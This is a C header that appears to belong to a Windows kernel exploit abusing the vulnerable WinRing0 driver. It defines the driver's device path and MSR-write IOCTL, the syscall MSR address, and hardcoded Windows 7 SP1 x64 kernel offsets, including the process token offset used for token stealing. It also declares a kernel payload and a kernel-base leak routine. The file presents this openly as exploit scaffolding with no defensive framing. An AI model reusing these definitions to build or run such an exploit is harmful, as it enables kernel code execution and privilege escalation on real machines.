#pragma once

#include <Windows.h>
#include <stdio.h>

#include "intrinsics.h"
#include "kernel_definitions.h"

// Credits:
// https://github.com/LibreHardwareMonitor/LibreHardwareMonitor/blob/master/WinRing0/OlsIoctl.h
// https://git.back.engineering/_xeroxz/msrexec/src/branch/master/vdm.hpp

#define TARGET_DEVICE "\\\\.\\GLOBALROOT\\Device\\WinRing0_1_2_0"

#define SYSTEM_SERVICE_CALL_TABLE_OFFSET_WIN7SP1X64 0xA1580
#define MMGETSYSTEMROUTINEADDRESS_OFFSET_WIN7SP1X64 0x327918
#define RTLINITUNICODESTRING_OFFSET_WIN7SP1X64 0x26450
#define PSINITIALSYSTEMPROCESS_OFFSET_WIN7SP1X64 0x29E028

#define EPROCESS_TOKEN_OFFSET_WIN7SP1X64 0x208

#define SYSCALL_MSR 0xC0000082
#define OLS_TYPE 40000
#define IOCTL_WRITE_MSR CTL_CODE(OLS_TYPE, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main(int argc, char** argv);
NTSTATUS kernel_payload();

void* leak_ntoskrnl_base_address();

typedef struct  _WRITEMSR_INPUT_STRUCTURE {
	unsigned long Register;
	void* Address;
} WRITEMSR_INPUT_STRUCTURE, * PWRITEMSR_INPUT_STRUCTURE;